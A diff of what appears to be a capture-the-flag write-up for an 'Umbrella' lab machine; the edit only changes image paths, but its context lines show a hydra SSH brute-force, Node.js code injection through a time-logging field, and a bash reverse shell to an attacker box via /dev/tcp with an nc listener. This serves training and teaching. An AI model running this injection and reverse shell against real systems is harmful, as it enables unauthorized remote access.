@@ -50,7 +50,7 @@ searchsploit mysql 5.7
 
 The website on 8080 is a login portal which POSTs login details to a /auth endpoint.
 
-![alt text](../../assets/imgs/umbrella-login.png)
+![alt text](/assets/imgs/umbrella-login.png)
 
 Testing some obvious username:password combinations against the services does not yield any results. Before we try to do some more bruteforcing against the previous services, the Docker Registry deserves some more attention. When we run `curl http:$IP:5000/v2 -vv` a 200 ok status code is returned, which verifies that the Docker Registry actually implements v2 of [CNCF Distribution http api](https://distribution.github.io/distribution/spec/api/). 
 
@@ -205,7 +205,11 @@ We add the cracked passwords to a file passwords.txt and then the user names, wi
 hydra -L users.txt -P passwords.txt $IP ssh -t 4 # Maximum four parallel tasks which is recommended for ssh
 ```
 
-When we log in with our new user, we are greeted with the dashboard of a time tracking application. Logging hours appear to be using the endpoint we are sure is vulnerable. We can verify that it is vulnerable by adding the following as our time in minutes: `require("process").pid` and see that our time increases, albeit with a small value, which makes sense as we are running in a container. Now that we have proved code execution, we can run a reverse shell. Run `nc -lnvp 8888` in the terminal on your attackbox and than fill in the following code in the input for time.
+When we log in with our new user, we are greeted with the dashboard of a time tracking application. 
+
+![Time portal](/assets/imgs/umbrella-log-time.png)
+
+Logging hours appear to be using the endpoint we are sure is vulnerable. We can verify that it is vulnerable by adding the following as our time in minutes: `require("process").pid` and see that our time increases, albeit with a small value, which makes sense as we are running in a container. Now that we have proved code execution, we can run a reverse shell. Run `nc -lnvp 8888` in the terminal on your attackbox and than fill in the following code in the input for time.
 
 ```js
 require("child_process").spawn("/bin/bash", ["-c", "/bin/bash -i >& /dev/tcp/<attackbox ip>/8888 0>&1"], {detached:true})
